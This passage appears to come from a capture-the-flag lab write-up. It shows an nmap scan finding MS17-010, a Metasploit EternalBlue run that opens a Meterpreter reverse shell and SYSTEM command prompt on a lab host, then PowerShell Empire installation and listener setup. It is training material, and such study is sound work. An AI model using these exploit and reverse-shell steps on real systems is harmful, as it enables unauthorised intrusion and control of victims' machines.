plain">OS:S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">OS:%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">OS:=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">OS:%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">OS:(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">OS:=N%T=80%CD=Z)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Network Distance: 2 hops</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host script results:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_smb-vuln-ms10-054: false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| smb-vuln-ms17-010: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   VULNERABLE:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     State: VULNERABLE</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     IDs:  CVE:CVE-2017-0143</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     Risk factor: HIGH</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|       A critical remote code execution vulnerability exists in Microsoft SMBv1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|        servers (ms17-010).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|           </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     Disclosure date: 2017-03-14</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     References:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">TRACEROUTE (using port 21/tcp)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">HOP RTT      ADDRESS</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">1   31.72 ms 10.8.0.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2   31.92 ms 10.10.80.135</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nmap done: 1 IP address (1 host up) scanned in 199.86 seconds</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol start="2"><li>Exploit the vulnerability to spawn a reverse shell!</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">| smb-vuln-ms17-010: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   VULNERABLE:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     State: VULNERABLE</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     IDs:  CVE:CVE-2017-0143</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     Risk factor: HIGH</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|       A critical remote code execution vulnerability exists in Microsoft SMBv1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|        servers (ms17-010).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|           </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     Disclosure date: 2017-03-14</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     References:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf5 &gt; search ms17-010</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Matching Modules</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   #  Name                                           Disclosure Date  Rank     Check  Description</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   -  ----                                           ---------------  ----     -----  -----------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Interact with a module by name or index, for example use 5 or use exploit/windows/smb/smb_doublepulsar_rce</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf5 &gt; use 2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Using configured payload windows/x64/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; show options</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   Name           Current Setting  Required  Description</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   ----           ---------------  --------  -----------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   RPORT          445              yes       The target port (TCP)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   SMBDomain      .                no        (Optional) The Windows domain to use for authentication</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   SMBPass                         no        (Optional) The password for the specified username</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   SMBUser                         no        (Optional) The username to authenticate as</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   Name      Current Setting  Required  Description</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   ----      ---------------  --------  -----------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   LHOST     192.168.178.52   yes       The listen address (an interface may be specified)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   LPORT     4444             yes       The listen port</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Exploit target:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   Id  Name</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   --  ----</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0   Windows 7 and Server 2008 R2 (x64) All Service Packs</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set LHOST 10.8.106.222</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">LHOST =&gt; 10.8.106.222</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 10.10.80.135</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">RHOSTS =&gt; 10.10.80.135</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Started reverse TCP handler on 10.8.106.222:4444 </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] 10.10.80.135:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] 10.10.80.135:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] 10.10.80.135:445      - Scanned 1 of 1 hosts (100% complete)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] 10.10.80.135:445 - Connecting to target for exploitation.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] 10.10.80.135:445 - Connection established for exploitation.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] 10.10.80.135:445 - Target OS selected valid for OS indicated by SMB reply</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] 10.10.80.135:445 - CORE raw buffer dump (42 bytes)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] 10.10.80.135:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] 10.10.80.135:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] 10.10.80.135:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] 10.10.80.135:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] 10.10.80.135:445 - Trying exploit with 12 Groom Allocations.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] 10.10.80.135:445 - Sending all but last fragment of exploit packet</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] 10.10.80.135:445 - Starting non-paged pool grooming</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] 10.10.80.135:445 - Sending SMBv2 buffers</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] 10.10.80.135:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] 10.10.80.135:445 - Sending final SMBv2 buffers.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] 10.10.80.135:445 - Sending last fragment of exploit packet!</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] 10.10.80.135:445 - Receiving response from exploit packet</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] 10.10.80.135:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] 10.10.80.135:445 - Sending egg to corrupted connection.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] 10.10.80.135:445 - Triggering free of corrupted buffer.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[-] 10.10.80.135:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[-] 10.10.80.135:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[-] 10.10.80.135:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] 10.10.80.135:445 - Connecting to target for exploitation.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] 10.10.80.135:445 - Connection established for exploitation.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] 10.10.80.135:445 - Target OS selected valid for OS indicated by SMB reply</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] 10.10.80.135:445 - CORE raw buffer dump (42 bytes)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] 10.10.80.135:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] 10.10.80.135:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] 10.10.80.135:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] 10.10.80.135:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] 10.10.80.135:445 - Trying exploit with 17 Groom Allocations.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] 10.10.80.135:445 - Sending all but last fragment of exploit packet</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] 10.10.80.135:445 - Starting non-paged pool grooming</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] 10.10.80.135:445 - Sending SMBv2 buffers</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] 10.10.80.135:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] 10.10.80.135:445 - Sending final SMBv2 buffers.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] 10.10.80.135:445 - Sending last fragment of exploit packet!</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] 10.10.80.135:445 - Receiving response from exploit packet</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] 10.10.80.135:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] 10.10.80.135:445 - Sending egg to corrupted connection.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] 10.10.80.135:445 - Triggering free of corrupted buffer.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Sending stage (201283 bytes) to 10.10.80.135</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Meterpreter session 1 opened (10.8.106.222:4444 -&gt; 10.10.80.135:49185) at 2020-10-03 22:28:34 +0200</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] 10.10.80.135:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] 10.10.80.135:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] 10.10.80.135:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">meterpreter &gt; shell</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Process 2240 created.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Channel 1 created.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Microsoft Windows [Version 6.1.7601]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">C:\Windows\system32&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="install">Install<a href="#install" class="hash-link" aria-label="Direct link to Install" title="Direct link to Install">​</a></h2><p>PowerShell Empire is a powerful post-exploitation framework which allows us to perform various functions such as privesc, password gathering, situational awareness, and many more!</p><p>Link to the official website: <a href="https://www.bc-security.org/post/the-empire-3-0-strikes-back" target="_blank" rel="noopener noreferrer">https://www.bc-security.org/post/the-empire-3-0-strikes-back</a></p><p>Clone the following GitHub page and run the initial setup script.
<a href="https://github.com/BC-SECURITY/Empire/" target="_blank" rel="noopener noreferrer">https://github.com/BC-SECURITY/Empire/</a></p><ol><li>cd /opt</li></ol><p><code>No answer needed</code></p><ol start="2"><li>git clone <a href="https://github.com/BC-SECURITY/Empire/" target="_blank" rel="noopener noreferrer">https://github.com/BC-SECURITY/Empire/</a></li></ol><p><code>No answer needed</code></p><ol start="3"><li>cd /opt/Empire</li></ol><p><code>No answer needed</code></p><ol start="4"><li>./setup/install.sh</li></ol><p><code>No answer needed</code></p><ol start="5"><li>When prompted, enter in a server negotiation password. This can be left blank for random generation, however, you should record this somewhere such as a LastPass vault.</li></ol><p><code>No answer needed</code></p><ol start="6"><li>Launch Empire with either ./empire or /opt/Empire/empire</li></ol><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="listeners">Listeners<a href="#listeners" class="hash-link" aria-label="Direct link to Listeners" title="Direct link to Listeners">​</a></h2><p>If you&#x27;re going to play ball, first you have to learn how to catch. Similar to &#x27;catching&#x27; a reverse shell with Netcat, we first have to set up a listener in order to properly handle any sort of agent we would install on our victim machine. Answer the following questions using the listeners help menu and then spawn a basic listener.</p><ol><li>Once empire has launched, type help to view the various menus. Which menu to we launch to access listeners?</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire) &gt; help</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Commands</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">========</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">agents            Jump to the Agents menu.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">creds             Add/display credentials to/from the database.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">exit              Exit Empire</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">help              Displays the help menu.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">interact          Interact with a particular agent.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">keyword           Add keyword to database for obfuscation</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">list              Lists active agents or listeners.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">listeners         Interact with active listeners.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">load              Loads Empire modules from a non-standard folder.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">plugin            Load a plugin file to extend Empire.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">plugins           List all available and active plugins.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">preobfuscate      Preobfuscate PowerShell module_source files</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">reload            Reload one (or all) Empire modules.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">report            Produce report CSV and log files: sessions.csv, credentials.csv, master.log</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">reset             Reset a global option (e.g. IP whitelists).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">resource          Read and execute a list of Empire commands from a file.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">searchmodule      Search Empire module names/descriptions.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">set               Set a global option (e.g. IP whitelists).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">show              Show a global option (e.g. IP whitelists).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uselistener       Use an Empire listener module.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">usemodule         Use an Empire module.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">usestager         Use an Empire stager.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire) &gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><blockquote><p><code>listeners         Interact with active listeners.</code></p></blockquote><p><code>listeners</code></p><ol start="2"><li>Launch the listeners menu. In a manner similar to cobalt strike/metasploit, this will launch a contextual submenu. For the sake of this tutorial, we will be using an http listener in order to catch our connections. Type the command &#x27;uselistener http&#x27; now. You can double-tap tab to view all options for listeners following typing &#x27;uselistener&#x27;</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire) &gt; listeners</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[!] No listeners currently active </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire: listeners) &gt; uselistener http</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire: listeners/http) &gt; </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" 